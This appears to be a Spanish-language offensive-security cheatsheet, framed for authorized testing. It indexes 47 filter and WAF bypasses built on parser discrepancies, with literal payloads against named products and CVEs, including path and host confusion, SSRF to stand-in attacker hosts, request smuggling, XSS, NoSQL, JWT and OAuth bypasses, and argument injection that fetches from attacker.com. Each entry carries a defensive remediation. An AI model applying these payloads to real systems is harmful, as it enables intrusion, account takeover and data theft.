# ELITE-CHEATSHEET-BYPASS — Bypasses de filtro y discrepancias de parser
**Fecha:** 2026-11-02 · Material para **pruebas autorizadas**. Cada entrada lleva su
remediación defensiva, que es lo que un defensor necesita para configurar reglas.

---

## Cómo leer este documento

**Regla de admisión.** Una entrada solo está aquí si cumple los cinco criterios: payload
literal de la fuente, objetivo real identificable (producto con versión, CVE o empresa
nombrada), sin placeholders muertos, principio en 1-2 frases, y precondición clara.

**Columna `WAF/Producto`.** Siempre con versión o fecha. Un bypass sin versión es folclore:
no se puede saber si sigue vivo.

**Columna `→ writeup`.** Cada entrada verificada remite al writeup de este repo que la
documenta completa, con su control negativo A/B y sus criterios de muerte. **Este
cheatsheet es el índice; el writeup es la fuente.**

**Lo que NO está aquí.** Técnicas de repos genéricos de GitHub, listas de payloads sin
objetivo nombrado, y bypasses "de 2025" sin versión de WAF. Lo rechazado está en
`_refactor/ELITE-REJECTED.md`.

---

## 0 — EL PRINCIPIO ÚNICO

Las 47 entradas de este documento son **una sola vulnerabilidad** repetida en sustratos
distintos:

> **Dos componentes leen el mismo dato con reglas distintas.**

Validador y cliente HTTP. Proxy y aplicación. Caché y origen. Front-end y back-end. Filtro
y motor. Aplicación y mailer. Sanitizador y parser del navegador.

La regla defensiva que lo cierra todo, literal de OWASP:

> *"Treat parser disagreement as a rejection."*
> *"Reject a URL whose host is not read identically by every parser in play, rather than
> reconciling the readings."*

**Intentar reconciliar las dos lecturas crea el bypass siguiente. Rechazar la ambigüedad lo
cierra.** Toda la columna de remediación de este documento es una variante de esa frase.

Corolario ofensivo, que es la heurística más productiva del repo: **busca los puntos donde
dos componentes leen el mismo dato.** No busques payloads.

---

## 1 — DISCREPANCIA DE RUTA Y NOMBRE DE FICHERO

El control de acceso compara una cadena de ruta; el ejecutor resuelve otra.

| # | Payload literal | WAF/Producto (versión) | Precondición | → writeup |
|---|---|---|---|---|
| 1.1 | `/admin.php%3Fooo.php` | **Apache < 2.4.60** + PHP-FPM | ACL por directiva `<Files>` sobre un `.php`, y `SetHandler proxy:...fcgi` | `idor/apache-acl-bypass-files-php-fpm.md` |
| 1.2 | `/admin/deleteUser.anything` | **Spring < 5.3** | `useSuffixPatternMatch` activo — **era el valor por defecto** | `idor/url-matching-spring-suffix-y-mayusculas.md` |
| 1.3 | `/ADMIN/DELETEUSER` | Apache / genérico | El enrutador mapea sin distinguir mayúsculas; el ACL sí distingue | ídem |
| 1.4 | `/admin/deleteUser/` | genérico | El ACL trata `/x` y `/x/` como endpoints distintos | ídem |
| 1.5 | `X-Original-URL: /admin`<br>`X-Rewrite-URL: /admin` | **Drupal, Symfony (CVE-2018-14773), Zend (ZF2018-01)** — corregido 2018-08-01 | ACL en el front-end por URL, framework que honra la cabecera | `idor/header-override-x-original-url-x-rewrite-url.md` |
| 1.6 | `/img%2fcustomer94342/listener.svg` | CDN sobre **Amazon S3** (proveedor de analítica anonimizado, 2022) | CSP añadida por **prefijo de ruta** `img/`; S3 trata `/` como parte de la clave | `auth/oauth-gadget-cdn-csp-bypass-s3-svg.md` |
| 1.7 | `/share/%2F..%2Fapi/auth/session?cachebuster=123` | **Cloudflare CDN + OpenAI/ChatGPT** (2024-02-04, $6.500) | Regla de caché por prefijo `/share/*`; el CDN no decodifica el traversal, el origen sí | `cache/wildcard-web-cache-deception-chatgpt.md` |
| 1.8 | `Host: ../?x=.vcap.me` | **Yahoo** (2017, $5.000) | Backend que normaliza la ruta. `vcap.me` resuelve a **127.0.0.1**, así que equivale a `http://127.0.0.1/` sin usar una IP literal | `ssrf/host-ambiguedad-arroba-y-url-absoluta.md` |
| 1.9 | `/html/usr/lib/cgi-bin/download.cgi%3F` | **Apache < 2.4.60** | `RewriteRule` en Server Config o VirtualHost. Apache abre la ruta **con y sin** DocumentRoot | `info-disclosure/apache-documentroot-confusion-local-gadgets.md` |
| 1.10 | `//` · `/%2F` · `/index.php/xyz` · `/(A(xyz))/` | **Apache · Nginx · PHP · .NET** (2020) | Mismo endpoint, **clave de caché distinta**. Sirve como cache-buster que no altera la respuesta | `cache/cache-parameter-cloaking-varnish-akamai-rails.md` |

**Remediación transversal.** Autorizar sobre el **recurso ya resuelto** —el controlador y el
objeto concretos— no sobre la cadena de la petición. Mientras se autorice comparando texto,
cada diferencia de normalización será un bypass. Para 1.5: el borde debe **eliminar** esas
cabeceras, que son internas y nunca deben aceptarse del cliente. Para 1.6 y 1.7: normalizar
y decodificar la ruta **antes** de evaluar cualquier regla.

> **Regla general que vale más que las diez entradas:** un control de seguridad que coincide
> por **prefijo de ruta** sobre un almacén o capa que normaliza la ruta **distinto** siempre
> tiene un bypass de codificación. Vale para CSP, reglas de caché, WAF y autorización.

---

## 2 — DISCREPANCIA DE URL Y HOST

La sintaxis de URL tiene **varios sitios donde puede vivir un host**. El validador mira uno.

| # | Payload literal | Producto (versión) | Precondición | → writeup |
|---|---|---|---|---|
| 2.1 | `http://example.com\@evil.com` | **Python `urllib`** | `urlsplit().hostname` devuelve `evil.com` — parte el netloc por la **última** `@` (`netloc.rpartition('@')`) | `ssrf/parser-confusion-backslash-arroba-python-urllib.md` |
| 2.2 | `GET @burp-collaborator.net/ HTTP/1.1`<br>`Host: newrelic.com` | **New Relic** + **Apache HttpComponents** (2017, HTTPCLIENT-1803) | La librería *"failed to require that paths start with '/'"*. Lo que parece host pasa a ser **userinfo** | `ssrf/host-ambiguedad-arroba-y-url-absoluta.md` |
| 2.3 | `Host: incapsula-client.net:80@burp-collaborator.net` | **Incapsula** (2017) | El backend lo convierte en `http://incapsula-client.net:80@burp-collaborator.net/` | ídem |
| 2.4 | `GET http://internal-website.mil/ HTTP/1.1`<br>`Host: xxxxxxx.mil` | **US DoD** (2017) | *"Some servers effectively whitelist the host header, but forget that the request line can also specify a host that takes precedence."* La allowlist funciona y es irrelevante | ídem |
| 2.5 | `GET xyz.burpcollaborator.net:80/bar HTTP/1.1` | **GlobaLeaks / Tor2web** (2017) | Puerto en el objetivo de la línea de petición | ídem |
| 2.6 | `/%5C%5Cattacker-server/path/to` | **Apache sobre Windows < 2.4.60** — **CVE-2024-38472** | `AllowEncodedSlashes On`; tras 2.4.49 además `MergeSlashes Off`. `%5C%5C` = `\\` = ruta UNC | `ssrf/apache-unc-ssrf-cve-2024-38472.md` |
| 2.7 | `/brokenproxy:unix:/run/[...]|http://path/to` | **Apache < 2.4.60** — **CVE-2024-39573** | Prefijo de sustitución de `RewriteRule` totalmente controlable. La fuente llama a tales reglas *"impractical"* | ídem |

**Trampa de instrumento en 2.6.** Lo que llega al host del investigador **no es HTTP**: es un
intento de autenticación **SMB**. Con un colaborador HTTP, la sonda vulnerable y una petición
inocua se ven idénticas —nada— y se concluye que no hay SSRF. Hay que escuchar con un
servidor SMB.

**Remediación.** Cita literal de OWASP: *"Do not accept complete URLs from the user... Match
the host against an allowlist, and build the request yourself."* Y: *"Use the output value of
the method/library as the IP address to compare against the allowlist"* — comparar **lo que
se va a usar**, no lo que se recibió. Para 2.6: bloquear SMB saliente desde el servidor web,
tráfico que un servidor web no tiene razón para generar.

---

## 3 — DISCREPANCIA DE FRAMING HTTP (desync)

| # | Payload literal | Producto (fecha) | Precondición | → writeup |
|---|---|---|---|---|
| 3.1 | `Expect: 100-continue` **sin ofuscar** | **T-Mobile** (2025-08, $12.000) | *"Simply sending a valid Expect header causes a 0.CL desync on numerous different servers."* Firma: el front-end responde **≠100 sin esperar** el cuerpo | `protocolo/expect-vanilla-0cl-tmobile.md` |
| 3.2 | `Expect: y 100-continue` | **GitLab** `h1.sec.gitlab.net` (2025-08, $7.000) | Inmune a `Expect` válido, vulnerable a la forma ofuscada. RQP necesitó ~27.000 peticiones | `protocolo/expect-obfuscado-0cl-gitlab-rqp.md` |
| 3.3 | `OPTIONS /anything` + `Expect: 100-continue` ofuscado | **Akamai CDN** — **CVE-2025-32094** ($9.000). Hosts literales: `auth.lastpass.com`, `www.sky.com` | Fallo *"fully inside Akamai's infrastructure"* | `protocolo/expect-obfuscado-cl0-akamai-cve-2025-32094.md` |
| 3.4 | `OPTIONS` + `Transfer-Encoding: chunked` + chunk `50` | **Google Cloud Load Balancer** (2024-07, $8.500) | **Solo `OPTIONS`**: *"failing both with GET and POST"*. GCP LB con HTTP/1.1 por defecto | `protocolo/te0-smuggling-google-cloud.md` |
| 3.5 | `Transfer-Encoding : chunked` *(espacio antes de los dos puntos)* | genérico CL.TE | Front-end y back-end discrepan al parsear la cabecera malformada | `skills/desync-triage/SKILL.md` §0 |
| 3.6 | Sonda V-H/H-V:<br>`Host: x/x` · `Xost: x/x`<br>`Host : foo/bar` · `Xost : foo/bar` | **IIS tras AWS ALB** (2025-08) | Cuatro peticiones, cuatro estados. Dos capas respondiendo = dos parsers | `skills/desync-triage/SKILL.md` |
| 3.7 | `GET ?report=albinowax` + cuerpo `report=innocent-victim` | **GitHub** (2020-08, **$10.000**) | **Varnish sin `builtin.vcl`** + framework que acepta cuerpos en GET (Rails, Rack::Cache) | `cache/fat-get-github-report-abuse.md` |
| 3.8 | `POST /assets` + cuerpo `GET /robots.txt HTTP/1.1\r\nX: Y` vía `fetch()` | **Akamai** sobre `www.capitalone.ca` (2021-11) | Akamai ignora el CL en respuestas de redirección. **Lo emite el navegador de la víctima** | `protocolo/client-side-desync-akamai-capitalone.md` |
| 3.9 | Cabeceras + espera > timeout + cuerpo | **Varnish CVE-2022-23959** · **Apache CVE-2022-22720** ($4.000 IBB) | Front-end que responde sin leer el cuerpo (`synth()`, `Redirect 301`) y reutiliza la conexión. Varnish: **15 s** por defecto | `protocolo/pause-based-desync-varnish-apache-cve-2022-23959.md` |
| 3.10 | `POST /b/ HTTP/2` + `Content-Length: 23` + prefijo | **amazon.com** `/b/` (2022-08) | Señal limpísima: dos `200 OK` con **Content-Type incompatible** (`text/html` e `image/x-icon`) | `protocolo/cl0-desync-amazon-h2.md` |

**Nota crítica de procedencia (3.8).** El JavaScript de los ataques client-side desync lleva
comentarios `//`. Con los saltos de línea colapsados por el render de la fuente, **comentan
el resto del bloque y el código no ejecuta**. Los `\r\n` *dentro* de los literales de cadena
sí son fiables: son escapes, y son la parte que importa.

**Remediación.** HTTP/2 extremo a extremo. Con la advertencia que evita una mitigación a
medias: degradar H2→H1.1 en el front-end mitiga los ataques **client-side** pero **no** los
pause-based de servidor. Y para implementadores: *"Never assume a request won't have a
body"*, *"Default to discarding the connection if you encounter any server-level exceptions
while handling a request."*

---

## 4 — DISCREPANCIA DE CONTENIDO, CHARSET Y TIPO

| # | Payload literal | Producto | Precondición | → writeup |
|---|---|---|---|---|
| 4.1 | `Content-Type:server-status %0d%0a`<br>`Content-Type:proxy:unix:/run/php/php-fpm.sock\|fcgi://127.0.0.1/tmp/ooo.php %0d%0a` | **Apache < 2.4.60**, 9 módulos (`mod_cgi`, `mod_wsgi`, `mod_perl`, `mod_fcgid`…) | *"if `r->handler` is empty, the content of the `r->content_type` is used as the final module handler"*. Requiere CRLF en una respuesta CGI | `protocolo/apache-handler-confusion-crlf-rce.md` |
| 4.2 | `Content-Type: text/xml` sobre un endpoint de formulario | genérico | **La sonda de mayor rendimiento y la que más se olvida.** Un endpoint de formularios puede tener detrás un parser XML completo | `inyeccion/xxe-lectura-ficheros-ssrf-y-xinclude.md` |
| 4.3 | `"__proto__":{"content-type":"application/json; charset=utf-7"}` + `"role":"+AGYAbwBv-"` | **Node.js / Express** | UTF-7 de `foo` es `+AGYAbwBv-`. Un valor inerte se decodifica a `foo` **sin provocar error** | `inyeccion/server-side-prototype-pollution-deteccion-y-rce.md` |
| 4.4 | `=?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net` | **GitHub · Zendesk · GitLab Enterprise** (corregidos 2024-04/05) | Parser que decodifica **encoded-word RFC 2047 dentro de la dirección** | `auth/email-encoded-word-rfc2047-bypass-dominio.md` |
| 4.5 | `oastify.com!collab\@example.com` | **Sendmail 8.15.2** | La `\` escapa la `@`; la `!` recupera el papel de delimitador como **bang path UUCP** | `auth/email-uucp-bang-path-sendmail.md` |
| 4.6 | `collab%psres.net(@example.com` | **Postfix 3.6.4** | El paréntesis **comenta** el dominio. Es sintaxis **válida** de RFC 2822: el validador cumple el estándar y eso *es* el fallo | `auth/email-postfix-comentario-source-route.md` |
| 4.7 | `xn--0117.example.com` → `foo@@.example.com`<br>`xn--x-0314.xn--0026.xn--0193.xn--0218` → `<x.. .=` | **Joomla — CVE-2024-21725** (corregido 2024-02-20) · **IdnaConvert** (2024-02-14) | **Escapar ANTES de decodificar Punycode.** El escapado está puesto, en el sitio equivocado de la tubería | `auth/punycode-malformado-joomla-cve-2024-21725.md` |
| 4.8 | `'❀'` → `'@'` · `'✼'` → `'<'` · `'✽'` → `'='`<br>(`'❀'.codePointAt(0) % 256 === 0x40`) | PHP `chr()` y similares | Reducción del punto de código **módulo 256**. Primitiva de **encadenamiento**: por sí sola no basta, y la fuente lo declara | `auth/email-unicode-overflow-modulo-256.md` |

**Remediación.** 4.7 da la regla transferible: **todo pipeline que escape y después
decodifique tiene esta forma.** El antipatrón `escapar → decodificar` es buscable en revisión
de código, y vale para Punycode, entidades HTML, URL-encoding y encoded-word. Para 4.4,
cita literal: *"I recommend you disable 'encoded-word' when using an email parsing library"*,
con el regex de último recurso `=[?].+[?]=`. Y la conclusión de fondo: *"it's never safe to
use email domains for access control enforcement"*.

---

## 5 — BYPASS DE FILTRO POR SUSTITUCIÓN DE UNA PASADA

El filtro no está mal escrito: opera sobre la representación equivocada.

| # | Payload literal | Filtro objetivo | Mecanismo | → writeup |
|---|---|---|---|---|
| 5.1 | `?__pro__proto__to__.gadget=payload` | Filtro que **elimina** `__proto__` una vez | Al borrar el interior queda `?__proto__.gadget=payload` | `inyeccion/prototype-pollution-deteccion-fuentes-cliente.md` |
| 5.2 | `- var x = root.process`<br>`- x = x.mainModule` | **CodePen** (corregido) — filtro de palabras `->process`, `->mainModule` | Trocear el acceso en dos sentencias: la cadena prohibida nunca aparece junta | `inyeccion/ssti-jade-node-child-process-codepen.md` |
| 5.3 | `query{__schema {queryType{name}}}`<br>GET: `?query=query%7B__schema%0A%7B...` | Filtro textual sobre `__schema{` | GraphQL tolera espacios donde el filtro no los espera. La variante GET añade que el filtro solo inspecciona cuerpos | `inyeccion/graphql-introspeccion-y-bypass-whitespace.md` |
| 5.4 | `<audio src/onerror=alert(1)>` | Filtro del **espacio** entre atributos | La `/` separa atributos sin espacio. Además `src` vacío garantiza el error de carga: ejecuta siempre, sin alojar nada | `xss/media-events-audio-video-onerror.md` |
| 5.5 | `oncontentvisibilityautostatechange=alert(1)` | **Lista negra enumerada** de nombres de evento | Si bloquea `onerror` y deja pasar este, la lista es enumerada y hay más huecos. Es el test que lo revela | `xss/content-visibility-autostatechange.md` |
| 5.6 | `<xss style="animation-name:x" onanimationstart=...>` + `<style>@keyframes x{}</style>` | Allowlist de **nombres de etiqueta** | `<xss>` no está en ninguna lista negra porque no existe en HTML. El `@keyframes` puede estar **vacío** | `xss/animation-events-ejecucion-sin-interaccion.md` |
| 5.7 | `__Host__` **≠** `__Host-` | — | **Errata en una remediación publicada** (Snyk). Aplicar la forma con dos guiones bajos produce una corrección **inoperante con apariencia de aplicada** | `auth/cookie-tossing-oauth-gitpod-cve-2024-21583.md` |

---

## 6 — DISCREPANCIA DE DELIMITADOR (cache parameter cloaking)

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 6.1 | `/search?q=help?_=payload&!&search=1` | **Varnish** con regex `"\?_=[^&]+&"` | El regex borra `?_=...&` al construir la clave; la aplicación **sí** recibe el payload | `cache/cache-parameter-cloaking-varnish-akamai-rails.md` |
| 6.2 | `/en?x=1?akamai-transform=payload` | **Akamai** (corregido tras el reporte) | Dos separadores, **misma clave**: el `?` no se reconoce para excluir el parámetro | ídem |
| 6.3 | `/jsonp?callback=legit&utm_content=x;callback=alert(1)//` | **Ruby on Rails** | Rails trata el **`;`** como delimitador de parámetros; la caché no | ídem |
| 6.4 | `Origin: '-alert(1)-'__` + `/?x=2__Origin='-alert(1)-'` | **Akamai** (*"working on a fix"*) | **La clave de caché es un formato serializado** construido por concatenación. Todo formato así es inyectable | `cache/cache-key-injection-akamai-origin.md` |
| 6.5 | `/%3fproduct=firefox-73.0.1-complete&...` | **nginx** + `download.mozilla.org` | Normalización de clave: `%3f` cambia la clave sin cambiar el recurso | ídem |
| 6.6 | `Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key` | **Akamai** | **No es un bypass: es el oráculo.** Devuelve `X-True-Cache-Key` y convierte la adivinanza en lectura | ídem |

**6.6 merece atención aparte.** Con la clave visible, el trabajo deja de ser adivinanza: se
compara **qué entra en la clave** con **qué llega a la aplicación**, y la diferencia *es* la
vulnerabilidad. Principio de recon: **busca el oráculo antes de atacar el mecanismo.**

---

## 7 — INYECCIÓN DE ARGUMENTOS (sin un solo metacarácter)

Todo filtro que busque `;`, `|`, `&`, `$` deja pasar estos intactos.

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 7.1 | `?url=--directory-prefix=. http://attacker.com/malicious.php` | PHP `escapeshellcmd()` | *"can pass unlimited parameters, but cannot execute other commands."* El segundo `--directory-prefix` sobrescribe el primero | `inyeccion/argument-injection-escapeshellcmd-wget-directory-prefix.md` |
| 7.2 | `-- http://host-controlado/c` | **curl** | *"In curl, later arguments are still URL operands: `--` does not prevent additional transfers."* **Documenta el fallo de una mitigación** | `inyeccion/argument-injection-curl-doble-guion-globoff.md` |
| 7.3 | Un **espacio** que añada un argumento | Java `Runtime.exec(String)` (deprecado en Java 18) | *"does NOT try to invoke the shell... does not support shell metacharacters."* Parte en tokens **solo por espacios** | `inyeccion/cmd-injection-java-runtime-exec-tokenizacion.md` |

**La firma de 7.3:** metacaracteres que **fallan** y un espacio que **funciona**. Si los
metacaracteres sí funcionan, hay una shell en medio y es otra clase. Probar solo
metacaracteres y archivar el objetivo es el error más común aquí.

---

## 8 — BYPASS DE VERIFICACIÓN CRIPTOGRÁFICA

| # | Payload literal | Mecanismo | → writeup |
|---|---|---|---|
| 8.1 | `{"alg":"none","typ":"JWT"}` + **punto final obligatorio**: `<header>.<payload>.` | *"the payload part must still be terminated with a trailing dot."* Sin el punto el token está mal formado y el rechazo se lee como "no vulnerable" | `auth/jwt-alg-none-token-sin-firma.md` |
| 8.2 | `{"kid":"../../../dev/null","alg":"HS256"}` + secreto = **cadena vacía** | No hay que **adivinar** el contenido de un fichero: basta elegir uno cuyo contenido se conozca | `auth/jwt-kid-path-traversal-devnull.md` |
| 8.3 | `alg` a `HS256` + firmar con la **clave pública RSA** como secreto HMAC | La clave pública se publica **por diseño**. El material del ataque no es un secreto filtrado | `auth/jwt-algorithm-confusion-rs256-hs256.md` |
| 8.4 | `response_type=code,id_token` · `response_mode=web_message` | Empuja todo al **fragmento**, que no se envía al servidor: el sitio no lo consume y el token queda vivo en `location.href` | `auth/oauth-response-type-switching-google-apple.md` |
| 8.5 | `/CaLlBaCk` · `/callbackxxx` · `/callback%3fcode=xxx%26` | **5 de 125** flujos de Google aceptaban también su página de inicio como `redirect_uri` (4%) | `auth/oauth-redirect-uri-case-shifting-y-appending.md` |

**Causa raíz de 8.1-8.3, una sola frase:** en JWT, **el dato que decide cómo validar viaja
dentro del dato a validar**. `alg`, `jwk`, `jku`, `kid` y `x5c` son instancias del mismo
error. La regla: la clave de verificación se resuelve desde **configuración del servidor**,
nunca desde contenido del token.

**Control de 8.5 que cuesta una petición y no toca OAuth:** enviar `?code=A&code=B` a la ruta
de callback y ver cuál gana. Si gana el primero, la variante es explotable.

---

## 9 — INYECCIÓN DE OPERADOR Y DE TIPO

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 9.1 | `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` | **MongoDB** | **Ningún metacarácter.** El ataque vive en el **tipo** del valor, no en su contenido. Un WAF de SQLi no ve nada porque no hay nada que ver | `inyeccion/nosql-operator-injection-bypass-autenticacion.md` |
| 9.2 | `username[$ne]=invalid` | MongoDB vía form-urlencoded | Misma inyección donde no se acepta JSON | ídem |
| 9.3 | `amount=-1000` | genérico | `importe <= saldo` es **siempre cierta** con un negativo. La validación funciona; la regla de negocio no estaba escrita | `logica-negocio/cantidad-negativa-transferencia-fondos.md` |
| 9.4 | `/FontMatrix [1 2 3 4 5 (0\); alert\('foobar')]` | **PDF.js < 4.2.67** — **CVE-2024-4367** | Una **optimización de rendimiento** que compila datos a JS con `new Function`. Mitigación: `isEvalSupported = false` | `xss/pdfjs-fontmatrix-cve-2024-4367.md` |
| 9.5 | `'foo' 'bar'` *(con espacio)* · `-- comment` *(con espacio tras el guion)* | **MySQL** | Dos caracteres invisibles al leer un payload. Cuando faltan, el fallo parece "no vulnerable" | `inyeccion/sqli-concatenacion-substring-comentarios-por-dbms.md` |
| 9.6 | `'foo'+'bar'` en **MySQL** → devuelve `0`, **no error** | MySQL | **Falso negativo silencioso**: si se espera un error como señal de "motor incorrecto", MySQL pasa desapercibido | ídem |

---

## 10 — MUTACIÓN POST-SANITIZACIÓN (mXSS)

| # | Payload literal | Producto | Mecanismo | → writeup |
|---|---|---|---|---|
| 10.1 | `<form><h1></form><table>...</table></h1></form>` × **510** + `<math><mi><style><!--</style>...` | **DOMPurify ≤ 3.1.2** (corregido en 3.1.3) | **Sanear dos veces es lo que lo rompe.** El aplanado ocurre **después** del parseo, así que la mutación se dispara en el tercer parseo | `xss/dompurify-mxss-triple-parsing.md` |
| 10.2 | `<form id="x "></form><input form="x" name="__depth">` | DOMPurify ≤ 3.1.2 | `_sanitizeAttributes` **recorta** los valores **después** de la comprobación de clobbering. Un espacio al final de un `id` | ídem |

**Por qué `n = 510`.** Está calibrado contra el límite de anidamiento del navegador:
DOMParser (Chromium, Firefox, Safari) aplana a **512**, mientras libxml2/php-xml/lxml
**eliminan** a 255 y nokogiri a 256. Que el navegador **aplane** en lugar de eliminar es la
precondición de toda la familia.

**Contradicción registrada:** el bloque de código de la Fig. 55 del artículo y su propio
enlace de PoC en vivo **no coinciden**. El writeup conserva ambas versiones sin elegir.

---

## 11 — WAFFLED: discrepancias de parseo de contenido contra WAFs comerciales

*(Sección pendiente de completar con las Tablas 3, 4 y 5 del paper — extracción en curso.)*

**Fuente:** WAFFLED: *Exploiting Parsing Discrepancies to Bypass Web Application Firewalls*.
Akhavani, Jabiyev, Kallus, Topcuoglu, Bratus, Kirda. **ACSAC 2025, pp. 689-702.**
DOI 10.1109/ACSAC67867.2025.00062. arXiv:2503.10846, CC BY 4.0.

### Dos correcciones a lo que se suele afirmar de este paper

**1. Los 1207 bypasses NO están publicados.** Cita literal de la sección 9: *"Sensitive
bypass requests will remain restricted until the vulnerabilities are resolved."* Lo que el
repo del paper publica son las **gramáticas del fuzzer**, la configuración de los WAFs y
HTTP-Normalizer.

**2. AWS no fue bypasseado — y el paper se contradice con su propio abstract.**

| Fuente dentro del paper | Afirmación |
|---|---|
| Abstract | *"1207 bypasses across 5 well-known WAFs, AWS, Azure, Cloud Armor, Cloudflare, and ModSecurity"* |
| Tabla 1, columna *Bypassed* | **`No` para Amazon AWS WAF**; `Yes` para los otros cuatro |
| Sección 7.4 | *"including the lack of successful bypasses against AWS WAF"* |
| Sección 9 (divulgación) | **omite AWS** |

Son **cuatro** WAFs bypasseados, no cinco.

### Límites que cada entrada de esta sección declarará
- **Fecha:** la Tabla 1 se encabeza *"As of July 2024."* Cloudflare *"stated that they are
  working on a fix"*; Azure estaba retirando CRS 3.0. **La aplicabilidad actual a cualquier
  WAF concreto no está establecida.**
- **El paper aporta envoltorios, no payloads de ataque.** Todos usan la misma cadena XSS de
  libro: las mutaciones se aplican *"everywhere except the attack payload itself"*.
- `1207` aparece **antes y después** de deduplicar (§6.1) sin explicación.
- El conteo de frameworks es inconsistente: §5.1 dice 6, §5.3 y la Tabla 2 listan 7.
- El *"más del 90%"* se apoya en **~50 sitios**, no 100: *"We chose the first 100 search
  results... About half of these webpages were excluded."*

### Lo ya extraído
**Listing 4 — continuación de boundary (RFC 2231):**
```
Content-Type: multipart/form-data; boundary=fake-boundary;boundary*0=real-;boundary*1=boundary
```
**Tabla 5, JSON, *Field Wrapper Manipulation*:**
```
{ "field1" \x00: "<script>alert(document.cookie)</script>" }
```

**Mitigación del propio paper:** HTTP-Normalizer, un proxy que valida las peticiones contra
los RFC vigentes. *"Our results demonstrate its effectiveness in normalizing or blocking all
bypass attempts presented in this work."* Es la aplicación del principio 0: **rechazar la
ambigüedad en lugar de reconciliarla.**

---

## 12 — Fuentes que NO entraron, y por qué

| Fuente | Motivo |
|---|---|
| **X/Twitter** (12 hunters) | `HTTP 402 Payment Required` en los tres perfiles probados. Inalcanzable. |
| **"Decepticon WAF Bypass skill"** | No localizable: ningún resultado menciona el nombre. |
| **`wafrift`** | Dos repos homónimos, ninguno canónico. Lo alcanzable es un **índice de estrategias de una herramienta**, sin WAF nombrado ni versión. Falla el criterio 2. Usable solo como taxonomía de nombres. |
| `botesjuan/Obfuscating-Techniques-WAF-Bypass`, `Ilias1988/waf-bypass` | Repos genéricos de GitHub: **prohibidos por contrato**. |
| Blogs de Medium "Bypassing WAFs in 2025" | Sin WAF nombrado con versión ni verificación. |

**Inventario completo de rechazos:** `_refactor/ELITE-REJECTED.md`.
